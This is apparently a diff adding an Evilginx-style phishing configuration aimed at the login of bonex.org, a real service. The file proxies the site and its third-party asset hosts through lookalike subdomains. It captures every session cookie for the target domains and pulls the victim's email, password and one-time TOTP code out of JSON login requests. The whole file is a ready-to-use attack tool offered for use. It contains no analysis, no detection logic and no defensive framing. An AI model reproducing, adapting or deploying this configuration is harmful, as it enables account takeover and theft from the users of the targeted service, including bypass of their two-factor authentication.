@@ -1,0 +1,86 @@
+author: '@EvilWhales'
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'bonex.org', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'fonts', orig_sub: 'fonts', domain: 'googleapis.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cdn', orig_sub: 'cdn', domain: 'datatables.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'cdnjs', orig_sub: 'cdnjs', domain: 'cloudflare.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'use', orig_sub: 'use', domain: 'typekit.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'googletagmanager.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www1', orig_sub: 'www', domain: 'freeprivacypolicy.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'p', orig_sub: 'p', domain: 'typekit.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'use', orig_sub: 'use', domain: 'typekit.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'fonts1', orig_sub: 'fonts', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'my', orig_sub: 'my', domain: 'spline.design', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: '', orig_sub: '', domain: 'unpkg.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'app', orig_sub: 'app', domain: 'spline.design', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www2', orig_sub: 'www', domain: 'google-analytics.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'googleads.g', orig_sub: 'googleads.g', domain: 'doubleclick.net', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'doubleclick.net', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'www3', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
+  - {phish_sub: 'yt3', orig_sub: 'yt3', domain: 'ggpht.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'jnn-pa', orig_sub: 'jnn-pa', domain: 'googleapis.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'rr4---sn-5goeenez', orig_sub: 'rr4---sn-5goeenez', domain: 'googlevideo.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www4', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www5', orig_sub: 'www', domain: 'youtube.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'rr1---sn-5go7yner', orig_sub: 'rr1---sn-5go7yner', domain: 'googlevideo.com', session: true, is_landing: false, auto_filter: true}
+
+sub_filters:
+  - {triggers_on: 'bonex.org', orig_sub: '', domain: 'bonex.org', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'fonts', domain: 'googleapis.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'cdn', domain: 'datatables.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'cdnjs', domain: 'cloudflare.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'use', domain: 'typekit.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'www', domain: 'googletagmanager.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'www', domain: 'freeprivacypolicy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'p', domain: 'typekit.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'use', domain: 'typekit.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'fonts', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'my', domain: 'spline.design', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: '', domain: 'unpkg.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'app', domain: 'spline.design', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'www', domain: 'google-analytics.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'googleads.g', domain: 'doubleclick.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'static', domain: 'doubleclick.net', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'yt3', domain: 'ggpht.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'jnn-pa', domain: 'googleapis.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'rr4---sn-5goeenez', domain: 'googlevideo.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'www', domain: 'youtube.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'bonex.org', orig_sub: 'rr1---sn-5go7yner', domain: 'googlevideo.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  
+  - {triggers_on: 'fonts.cloudflare.com', orig_sub: 'fonts', domain: 'cloudflare.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www4.gstatic.com', orig_sub: 'www', domain: 'gstatic.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+  - {triggers_on: 'www3.google.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html','text/plain', 'application/binary', 'application/javascript', 'application/json', 'image/png', 'image/svg+xml', 'image/x-icon','application/manifest+json','text/javascript']}
+
+auth_tokens:
+  - domain: '.cloudflare.com'
+    keys: ['.*,regexp']
+  - domain: '.bonex.org'
+    keys: ['.*,regexp']
+
+
+#https://bonex.org/api/auth/local/signin
+
+auth_urls:
+  - "/profile"
+
+credentials:
+  username:
+    key: 'email'
+    search: '"email":"([^"]*)'
+    type: 'json'
+  password:
+    key: 'password'
+    search: '"password":"([^"]*)'
+    type: 'json'
+  custom:
+    - key: 'totp'
+      search: '"totp":"([^"]*)'
+      type: 'json'
+
+login:
+  domain: 'bonex.org'
+  path: '/login'
